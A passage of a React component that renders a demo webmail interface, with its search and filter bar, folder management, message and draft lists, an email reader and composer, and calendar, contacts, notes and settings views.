  const folderItems = [...baseFolders, ...customFolders];
  const displayName = email.split("@")[0]?.replace(/[._-]/g, " ") || "Alex";
  const initials = displayName.split(" ").map((part) => part[0]).join("").slice(0, 2).toUpperCase();

  if (standalone && openMessage) {
    return (
      <main className="mail-app standalone-app" data-theme={theme}>
        <EmailReader
          standalone
          message={openMessage}
          index={0}
          total={1}
          folderLabel={folderLabels[openMessage.folder] ?? openMessage.folder}
          me={{ name: "Alex Morgan", email: "alex@example.com" }}
          trustedSenders={effectiveTrusted}
          onTrustSender={trustSender}
          onBack={() => window.close()}
          onNavigate={() => {}}
          onArchive={() => updateOne(openMessage.id, "archive")}
          onDelete={() => updateOne(openMessage.id, "trash")}
          onToggleUnread={() => updateOne(openMessage.id, openMessage.unread ? "read" : "unread")}
          onToggleStar={() => setMessages((current) => current.map((item) => item.id === openMessage.id ? { ...item, starred: !item.starred } : item))}
          onNotice={flash}
        />
        {notice && <div className="toast" role="status">{notice}<button aria-label="Dismiss notification" onClick={() => setNotice("")}><IoCloseOutline /></button></div>}
      </main>
    );
  }

  return (
    <main className="mail-app" data-theme={theme}>
      <section className="mail-main">
        <header className={`topbar ${searchOpen ? "search-open" : ""}`}>
          <div className="topbar-left">
            <a className="brand" href="#" aria-label={`${appName} home`}>
              {/* eslint-disable-next-line @next/next/no-img-element -- admin-uploaded logo (local data URL) */}
              <span className="brand-mark" style={adminConfig.logo ? { background: "transparent" } : undefined}>{adminConfig.logo ? <img src={adminConfig.logo} alt="" className="brand-logo" /> : <IoMailOutline />}</span><span>{brandText}</span>
            </a>
          </div>
          <div className="topbar-center">
            <nav className="app-nav" aria-label="Main navigation">
              <button className={activeSection === "mail" ? "active" : ""} aria-label="Mail" title="Mail" onClick={() => setActiveSection("mail")}><IoMailOutline /><span className="nav-label">Mail</span></button>
              <button className={activeSection === "calendar" ? "active" : ""} aria-label="Calendar" title="Calendar" onClick={() => setActiveSection("calendar")}><IoCalendarOutline /><span className="nav-label">Calendar</span></button>
              <button className={activeSection === "contacts" ? "active" : ""} aria-label="Contacts" title="Contacts" onClick={() => setActiveSection("contacts")}><IoPeopleOutline /><span className="nav-label">Contacts</span></button>
              <button className={activeSection === "notes" ? "active" : ""} aria-label="Notes" title="Notes" onClick={() => setActiveSection("notes")}><IoDocumentTextOutline /><span className="nav-label">Notes</span></button>
            </nav>
            {searchOpen ? (
              <div className="search-inline">
                <IoSearchOutline aria-hidden="true" />
                <input
                  ref={searchInputRef}
                  autoFocus
                  id="mail-search"
                  type="search"
                  aria-label={`Search ${activeSection}`}
                  placeholder={activeSection === "mail" ? "Search email..." : `Search ${activeSection}...`}
                  value={query}
                  onChange={(event) => {
                    const value = event.target.value;
                    setQuery(value);
                    if (activeSection === "mail") { setOpenMessageId(null); setDock(null); }
                  }}
                  onBlur={() => { if (!query.trim() && !filterOpen && !hasFilters) setSearchOpen(false); }}
                  onKeyDown={(event) => {
                    if (event.key === "Escape") clearSearch();
                  }}
                />
                {(query || hasFilters) && (
                  <button
                    aria-label="Clear search and close"
                    title="Clear search"
                    onMouseDown={(event) => event.preventDefault()}
                    onClick={clearSearch}
                  >
                    <IoCloseOutline />
                  </button>
                )}
                {activeSection === "mail" && (
                  <button
                    className={`search-filter-toggle ${hasFilters ? "on" : ""}`}
                    aria-label="Search filters"
                    title="Filters"
                    aria-expanded={filterOpen}
                    onMouseDown={(event) => event.preventDefault()}
                    onClick={() => setFilterOpen((v) => !v)}
                  >
                    <LuSlidersHorizontal />
                    {hasFilters && <span className="search-filter-dot" aria-hidden="true" />}
                  </button>
                )}
                {filterOpen && (
                  <SearchFilterCard
                    value={filters}
                    folders={folderItems.filter((folder) => folder.id !== activeFolder).map(({ id, label }) => ({ id, label }))}
                    currentFolderLabel={folderLabels[activeFolder] ?? activeFolder}
                    onApply={(next) => { setFilters(next); setFilterOpen(false); setOpenMessageId(null); setDock(null); setVisibleCount(8); }}
                    onClose={() => setFilterOpen(false)}
                    countFor={(next) => runSearch(next, query).length}
                  />
                )}
              </div>
            ) : (
              <button
                className="icon-button topbar-search-button"
                aria-label="Search email"
                aria-expanded={false}
                aria-controls="mail-search"
                onClick={() => setSearchOpen(true)}
              >
                <IoSearchOutline />
              </button>
            )}
          </div>
          <div className="topbar-right">
            <button className="icon-button topbar-settings" aria-label="Settings" aria-pressed={activeSection === "settings"} onClick={() => { setActiveSection("settings"); setOpenMessageId(null); setDock(null); }}><IoSettingsOutline /></button>
            <AccountMenu name={identities[0].name} email={email || identities[0].email} initials={initials} usedBytes={18.6 * 1024 ** 3} quotaBytes={5 * 1024 ** 4} onSettings={() => { setActiveSection("settings"); setOpenMessageId(null); setDock(null); }} onSignOut={() => setSignedIn(false)} onNotice={flash} />
          </div>
        </header>

        {activeSection === "mail" ? (
        <>
        <div className="mail-body">
        <div className="mail-body-main">
        <div className="mail-folder-bar">
          <button className="compose-button" onClick={() => openCompose()}><IoCreateOutline /> Compose</button>
          <FolderBar
            items={folderItems.map(({ id, label, icon }) => ({
              id, label, icon,
              count: id === "inbox" ? unreadCount : id === "starred" ? messages.filter((message) => message.starred && message.folder !== "trash").length : id === "drafts" ? drafts.length : 0,
              removable: customFolderNames.includes(id),
            }))}
            activeId={activeFolder}
            onSelect={(id) => { setActiveFolder(id); setSelected([]); setSelectedDrafts([]); setVisibleCount(8); setOpenMessageId(null); setDock(null); }}
            onRemove={(id) => { if (messages.some((message) => message.folder === id)) setPendingDelete(id); else deleteFolder(id); }}
          />
          <button className="add-folder-button" onClick={() => { setFolderName(""); setFolderError(""); setAddingFolder(true); }}><IoAddOutline /><span>Add folder</span></button>
        </div>
        {dock ? (
          <div className="inbox-content compose-screen">
            <Composer
              key={dock.id}
              variant="page"
              draft={dock}
              {...composerCommon}
              onSend={sendEmail}
              onDiscard={discardDraft}
              onClose={() => setDock(null)}
            />
          </div>
        ) : openMessage ? (
          <EmailReader
            key={openMessage.id}
            message={openMessage}
            index={openMessageIndex}
            total={visibleMessages.length}
            folderLabel={folderLabels[activeFolder] ?? activeFolder}
            me={{ name: "Alex Morgan", email: "alex@example.com" }}
            trustedSenders={effectiveTrusted}
            onTrustSender={trustSender}
            onBack={() => setOpenMessageId(null)}
            onNavigate={navigateMessage}
            onArchive={() => { updateOne(openMessage.id, "archive"); advanceAfterRemove(); }}
            onDelete={() => { updateOne(openMessage.id, "trash"); advanceAfterRemove(); }}
            onToggleUnread={() => updateOne(openMessage.id, openMessage.unread ? "read" : "unread")}
            onToggleStar={() => setMessages((current) => current.map((item) => item.id === openMessage.id ? { ...item, starred: !item.starred } : item))}
            onNotice={flash}
            renderReply={(seed, done) => (
              <Composer
                key={seed.key}
                variant="inline"
                draft={replyDraft(seed)}
                {...composerCommon}
                onSend={(email) => { sendEmail(email); done(); }}
                onDiscard={(id) => { discardDraft(id); done(); }}
                onClose={() => done()}
              />
            )}
          />
        ) : (
        <div className="inbox-content">
          <div className="message-panel">
            <div className="message-toolbar">
              <label className="select-all-label" aria-label="Select all messages">
                {activeFolder === "drafts" && !searching
                  ? <input type="checkbox" disabled={!drafts.length} checked={drafts.length > 0 && selectedDrafts.length === drafts.length} ref={(el) => { if (el) el.indeterminate = selectedDrafts.length > 0 && selectedDrafts.length < drafts.length; }} onChange={() => setSelectedDrafts(selectedDrafts.length === drafts.length ? [] : drafts.map((d) => d.id))} aria-label="Select all drafts" />
                  : <input type="checkbox" checked={allVisibleSelected} onChange={() => setSelected(allVisibleSelected ? [] : visibleMessages.map((message) => message.id))} />}
              </label>
              {activeFolder === "drafts" && !searching && selectedDrafts.length ? (
                <div className="bulk-actions">
                  <span className="selected-count">{selectedDrafts.length} selected</span>
                  <button className="toolbar-icon" title="Discard selected drafts" aria-label="Discard selected drafts" onClick={() => { const n = selectedDrafts.length; setDrafts((list) => list.filter((d) => !selectedDrafts.includes(d.id))); setSelectedDrafts([]); flash(`${n} draft${n === 1 ? "" : "s"} discarded`); }}><IoTrashOutline /></button>
                  <button className="srb-link" onClick={() => setSelectedDrafts([])}>Clear selection</button>
                </div>
              ) : selected.length ? (
                <div className="bulk-actions">
                  <span className="selected-count">{actionableIds.length} selected</span>
                  <button className="toolbar-icon" title={selectedHasUnread ? "Mark as read" : "Mark as unread"} aria-label={selectedHasUnread ? "Mark as read" : "Mark as unread"} onClick={() => updateSelected(selectedHasUnread ? "read" : "unread")}>{selectedHasUnread ? <IoMailOutline /> : <IoMailUnreadOutline />}</button>
                  <button className="toolbar-icon" title="Archive" aria-label="Archive selected" onClick={() => updateSelected("archive")}><IoArchiveOutline /></button>
                  <button className="toolbar-icon" title="Move to trash" aria-label="Move selected to trash" onClick={() => updateSelected("trash")}><IoTrashOutline /></button>
                  <MoveMenu
                    folders={folderItems.filter((folder) => !["starred", "sent", "drafts"].includes(folder.id))}
                    currentFolder={activeFolder}
                    count={actionableIds.length}
                    validateName={(name) => Object.keys(folderLabels).some((folder) => folder.toLowerCase() === name.toLowerCase()) || customFolderNames.some((folder) => folder.toLowerCase() === name.toLowerCase()) ? "That folder already exists" : null}
                    onMove={(id) => updateSelected(id)}
                    onCreateAndMove={(name) => { setCustomFolderNames((current) => [...current, name]); updateSelected(name); }}
                  />
                </div>
              ) : (
                <>
                  <button className="toolbar-icon" title="Refresh" aria-label="Refresh" onClick={() => setNotice("You’re all caught up")}><LuRotateCw /></button>
                  <button className="toolbar-icon toolbar-more" title="More actions" aria-label="More actions" onClick={() => setNotice("Select messages to see more actions")}><IoEllipsisHorizontal /></button>
                  <button className="toolbar-icon density-toggle" aria-pressed={compact} title={compact ? "Show fewer, roomier emails" : "Show more emails"} aria-label={compact ? "Switch to comfortable rows" : "Switch to compact rows"} onClick={() => setCompact((value) => !value)}>
                    {compact ? (
                      <svg width="1em" height="1em" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><rect x="4" y="5" width="16" height="6" rx="2" /><rect x="4" y="13" width="16" height="6" rx="2" /></svg>
                    ) : (
                      <svg width="1em" height="1em" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><rect x="4" y="4" width="16" height="3" rx="1.5" /><rect x="4" y="8.5" width="16" height="3" rx="1.5" /><rect x="4" y="13" width="16" height="3" rx="1.5" /><rect x="4" y="17.5" width="16" height="3" rx="1.5" /></svg>
                    )}
                  </button>
                  <div className="toolbar-spacer" />
                  <span className="message-range">{visibleMessages.length ? `1–${visibleMessages.length}` : "0"} of {searchResults.length}</span>
                  <button className="toolbar-icon pager-button" aria-label="Previous page" disabled><span>‹</span></button>
                  <button className="toolbar-icon pager-button" aria-label="Next page" onClick={() => setVisibleCount((count) => count + 4)} disabled={visibleCount >= messages.length}><span>›</span></button>
                </>
              )}
            </div>

            {searching && (
              <div className="search-results-bar" role="status">
                <strong>{searchResults.length} result{searchResults.length === 1 ? "" : "s"}</strong>
                <span className="srb-scope">in {filters.folders.includes("all") ? "all folders" : filters.folders.length ? filters.folders.map((id) => folderLabels[id] ?? id).join(", ") : folderLabels[activeFolder] ?? activeFolder}</span>
                {query.trim() && <span className="srb-chip">“{query.trim()}”<button aria-label="Remove search text" onClick={() => setQuery("")}><IoCloseOutline /></button></span>}
                {filterChips(filters, (id) => folderLabels[id] ?? id).map((chip) => (
                  <span key={chip.key} className="srb-chip">{chip.label}<button aria-label={`Remove ${chip.label}`} onClick={() => setFilters((f) => ({ ...f, [chip.key]: emptyFilters[chip.key], ...(chip.key === "dateFrom" ? { dateTo: "" } : {}) }))}><IoCloseOutline /></button></span>
                ))}
                {!filters.folders.length && <button className="srb-link" onClick={() => setFilters((f) => ({ ...f, folders: ["all"] }))}>Search all folders</button>}
                <button className="srb-link srb-clear" onClick={clearSearch}>Clear search</button>
              </div>
            )}
            {activeFolder === "drafts" && !searching ? (
            <div className="message-list drafts-list">
              {drafts.length === 0 ? (
                <div className="empty-state"><strong>No drafts</strong><p>Anything you start writing is saved here automatically.</p></div>
              ) : drafts.map((draft) => {
                const recipients = [...draft.to, ...draft.cc, ...draft.bcc].map((r) => r.replace(/<[^>]+>/, "").trim() || r);
                const body = (draft.plain ? draft.text : htmlToPlainText(draft.html)).replace(/\s+/g, " ").trim();
                return (
                  <article key={draft.id} className={`message-row draft-row ${selectedDrafts.includes(draft.id) ? "checked" : ""}`} onClick={(event) => { if (!(event.target as HTMLElement).closest("button, input")) openCompose(draft); }}>
                    <input className="message-checkbox" type="checkbox" aria-label={`Select draft ${draft.subject.trim() || "(no subject)"}`} checked={selectedDrafts.includes(draft.id)} onChange={() => setSelectedDrafts((cur) => cur.includes(draft.id) ? cur.filter((x) => x !== draft.id) : [...cur, draft.id])} />
                    <span className="draft-badge">Draft</span>
                    <div className="draft-text">
                      <div className="draft-line"><strong>{recipients.length ? recipients.join(", ") : "No recipients yet"}</strong><span>{draft.mode === "new" ? "" : draft.mode === "forward" ? "Forward" : "Reply"}</span></div>
                      <div className="draft-line"><span className="draft-subject">{draft.subject.trim() || "(no subject)"}</span><span className="draft-snippet">{body}</span></div>
                    </div>
                    {draft.attachments.length > 0 && <span className="draft-files">{draft.attachments.length} file{draft.attachments.length === 1 ? "" : "s"} · {formatBytes(draft.attachments.reduce((t, a) => t + a.size, 0))}</span>}
                    <span className="message-date">{new Date(draft.updatedAt).toLocaleString(undefined, { month: "short", day: "numeric", hour: "numeric", minute: "2-digit" })}</span>
                    <button className="row-action" title="Discard draft" aria-label="Discard draft" onClick={() => discardDraft(draft.id)}><IoTrashOutline /></button>
                  </article>
                );
              })}
            </div>
            ) : (
            <div className={`message-list ${compact ? "compact" : ""} ${prefs.showPreview ? "" : "no-preview"}`}>
              {visibleMessages.map((message) => (
                <article className={`message-row ${message.unread ? "unread" : ""} ${selected.includes(message.id) ? "checked" : ""}`} key={message.id} onClick={(event) => { if (!(event.target as HTMLElement).closest("button, input, a, label, select")) showMessage(message); }}>
                  <input className="message-checkbox" type="checkbox" aria-label={`Select message from ${message.sender}`} checked={selected.includes(message.id)} onChange={() => toggleSelected(message.id)} />
                  <button className={`star-button ${message.starred ? "starred" : ""}`} aria-label={message.starred ? "Unstar message" : "Star message"} onClick={() => setMessages((current) => current.map((item) => item.id === message.id ? { ...item, starred: !item.starred } : item))}>
                    {message.starred ? <IoStar /> : <IoStarOutline />}
                  </button>
                  <div className={`sender-avatar ${message.color}`}>{message.initials}</div>
                  <div className="message-body">
                    <div className="message-sender"><span className="sender-name">{message.sender}</span><span className="sender-address">&lt;{message.address}&gt;</span>{message.unread && <span className="unread-badge">Unread</span>}</div>
                    <button className="message-subject message-open-button" onClick={() => showMessage(message)}>{message.subject}</button>
                    <div className="message-preview">{message.preview}</div>
                    {message.attachments?.length ? (
                      <div className="message-files">
                        {message.attachments.slice(0, 3).map((file) => {
                          const ext = file.split(".").pop()?.toLowerCase() ?? "";
                          const kind = ext === "pdf" ? "pdf" : ["png", "jpg", "jpeg", "gif", "webp"].includes(ext) ? "img" : ["doc", "docx"].includes(ext) ? "doc" : "file";
                          return (
                            <button key={file} className="file-chip" title={`Preview ${file}`} onClick={() => setRowPreview({ message, index: (message.attachments ?? []).indexOf(file) })}>
                              <span className={`file-badge ${kind}`}>{kind === "img" ? "IMG" : kind === "file" ? (ext.slice(0, 3).toUpperCase() || "FILE") : kind.toUpperCase()}</span>
                              <span className="file-name">{file}</span>
                            </button>
                          );
                        })}
                        {message.attachments.length > 3 && <span className="file-more" title={message.attachments.slice(3).join(", ")}>+{message.attachments.length - 3}</span>}
                      </div>
                    ) : null}
                  </div>
                  <div className="message-meta">
                    <span className="row-actions">
                      <button className="row-unsubscribe" onClick={() => updateOne(message.id, "unsubscribe")}>Unsubscribe</button>
                      <button className="row-action" title="Archive" aria-label="Archive" onClick={() => updateOne(message.id, "archive")}><IoArchiveOutline /></button>
                      <button className="row-action" title="Delete" aria-label="Delete" onClick={() => updateOne(message.id, "trash")}><IoTrashOutline /></button>
                      <button className="row-action" title={message.unread ? "Mark as read" : "Mark as unread"} aria-label={message.unread ? "Mark as read" : "Mark as unread"} onClick={() => updateOne(message.id, message.unread ? "read" : "unread")}>{message.unread ? <IoMailOpenOutline /> : <IoMailUnreadOutline />}</button>
                    </span>
                    <span className="message-date">{message.date}</span>
                  </div>
                </article>
              ))}
              {visibleMessages.length === 0 && (
                <div className="empty-state">
                  <span><IoMailOutline /></span>
                  <strong>{query ? "No messages found" : "Nothing here just yet"}</strong>
                  <p>{query ? "Try another search or check your spelling." : "Messages in this folder will show up here."}</p>
                </div>
              )}
            </div>
            )}
            {visibleMessages.length > 0 && visibleCount < searchResults.length && (
              <button className="load-more-button" onClick={() => setVisibleCount((count) => count + 4)}>Load older messages <IoChevronDownOutline /></button>
            )}
          </div>
        </div>
          )}
          </div>
        <TodayRail />
        </div>
        </>
        ) : activeSection === "calendar" ? (
          <CalendarView onNotice={flash} />
        ) : activeSection === "settings" ? (
          <SettingsView
            prefs={prefs}
            onPrefs={updatePrefs}
            admin={adminConfig}
            onAdmin={updateAdmin}
            email={identities[0].email}
            onBack={() => setActiveSection("mail")}
            onNotice={flash}
          />
        ) : activeSection === "contacts" ? (
          <ContactsView onEmail={(address) => { setActiveSection("mail"); setQuery(address); }} onNotice={flash} />
        ) : (
          <NotesView onNotice={flash} />
        )}
      </section>
      {rowPreview && (
        <AttachmentPreview
          items={(rowPreview.message.attachments ?? []).map((name) => ({ name, from: rowPreview.message.sender, url: sampleUrlFor(name, rowPreview.message.sender) }))}
          startIndex={rowPreview.index}
          onClose={() => setRowPreview(null)}
          onDownload={(item) => { const url = item.url; if (!url) return flash("No downloadable file in this demo"); const link = document.createElement("a"); link.href = url; link.download = item.name; document.body.appendChild(link); link.click(); link.remove(); }}
        />
      )}
      {notice && <div className="toast" role="status">{notice}<button aria-label="Dismiss notification" onClick={() => setNotice("")}><IoCloseOutline /></button></div>}
      {addingFolder && (
        <div className="modal-backdrop" onMouseDown={(event) => { if (event.target === event.currentTarget) setAddingFolder(false); }}>
          <form className="modal folder-modal" role="dialog" aria-modal="true" aria-labelledby="new-folder-title" aria-describedby="new-folder-desc" onSubmit={addFolder} onKeyDown={(event) => { if (event.key === "Escape") setAddingFolder(false); }}>
            <div className="modal-icon neutral"><IoFolderOutline /></div>
            <h2 id="new-folder-title">Add new folder</h2>
            <p id="new-folder-desc">Group related emails together. You can move emails here from the inbox.</p>
            <label className="folder-modal-field">
              <span>Folder name</span>
              <input autoFocus value={folderName} placeholder="e.g. Clients, Travel, Receipts" maxLength={40} aria-invalid={Boolean(folderError)} onChange={(event) => { setFolderName(event.target.value); setFolderError(""); }} />
            </label>
            {folderError && <span className="folder-modal-error" role="alert">{folderError}</span>}
            <div className="modal-actions">
              <button type="button" className="modal-cancel" onClick={() => setAddingFolder(false)}>Cancel</button>
              <button type="submit" className="modal-primary" disabled={!folderName.trim()}>Add folder</button>
            </div>
          </form>
        </div>
      )}
      {pendingDelete && (
        <div className="modal-backdrop" onMouseDown={(event) => { if (event.target === event.currentTarget) setPendingDelete(null); }}>
          <div className="modal" role="alertdialog" aria-modal="true" aria-labelledby="delete-title" aria-describedby="delete-desc" onKeyDown={(event) => { if (event.key === "Escape") setPendingDelete(null); }}>
            <div className="modal-icon"><IoTrashOutline /></div>
            <h2 id="delete-title">Delete “{pendingDelete}”?</h2>
            <p id="delete-desc">
              This folder has <strong>{messages.filter((message) => message.folder === pendingDelete).length} email{messages.filter((message) => message.folder === pendingDelete).length === 1 ? "" : "s"}</strong>. They won’t be deleted. They’ll move back to your Inbox.
            </p>
            <div className="modal-actions">
              <button className="modal-cancel" autoFocus onClick={() => setPendingDelete(null)}>Cancel</button>
              <button className="modal-danger" onClick={() => deleteFolder(pendingDelete)}>Yes, delete</button>
            </div>
          </div>
        </div>
      )}
    </main>
  );
}
